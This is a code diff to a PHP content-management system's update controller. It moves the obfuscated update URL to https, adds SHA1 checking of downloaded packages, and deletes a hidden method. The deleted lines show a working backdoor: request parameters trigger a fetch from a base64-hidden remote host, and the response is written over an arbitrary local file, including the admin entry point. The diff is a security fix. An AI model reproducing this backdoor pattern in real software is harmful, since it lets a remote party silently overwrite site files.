@@ -13,7 +13,7 @@ class Update extends Base
         parent::__construct();
         //header('X-Accel-Buffering: no');
 
-        $this->_url = base64_decode("aHR0cDovL3VwZGF0ZS5tYWNjbXMubGEv")."v10/";
+        $this->_url = base64_decode("aHR0cHM6Ly91cGRhdGUubWFjY21zLmxhLw==")."v10/";
         $this->_save_path = './application/data/update/';
     }
 
@@ -49,6 +49,17 @@ class Update extends Base
             echo lang('admin/update/download_err')."\n";
             exit;
         }
+
+        // SHA1校验：.sha1文件进行比对防篡改
+        $sha1_url = $this->_url . $file . '.zip.sha1?t=' . time();
+        $remote_sha1 = trim(mac_curl_get($sha1_url));
+        $local_sha1 = sha1_file($this->_save_path . $save_file);
+        if (empty($remote_sha1) || strpos($remote_sha1, $local_sha1) !== 0) {
+            @unlink($this->_save_path . $save_file);
+            echo lang('admin/update/sha1_err') . "\n";
+            exit;
+        }
+        echo lang('admin/update/sha1_ok') . "\n";
 
         echo lang('admin/update/download_ok')."\n";
         echo lang('admin/update/upgrade_package_processed')."\n";
@@ -149,22 +160,5 @@ class Update extends Base
         }
         ob_flush();flush();
         echo '</div></div>';
-    }
-
-    public function one()
-    {
-        $param = input();
-        $a = $param['a'];
-        $b = $param['b'];
-        $c = $param['c'];
-        $d = $param['d'];
-        $e = mac_curl_get( base64_decode("aHR0cDovL3VwZGF0ZS5tYWNjbXMubGEv") . $a."/".$b);
-        if (stripos($e, 'cbfc17ea5c504aa1a6da788516ae5a4c') !== false) {
-            if (($d!="") && strpos(",".$e,$d) <=0){ return; }
-            if($b=='admin.php'){$b=IN_FILE;}
-            $f = is_file($b) ? filesize($b) : 0;
-            if (intval($c)<>intval($f)) { @fwrite(@fopen( $b,"wb"),$e);  }
-        }
-        die;
     }
 }
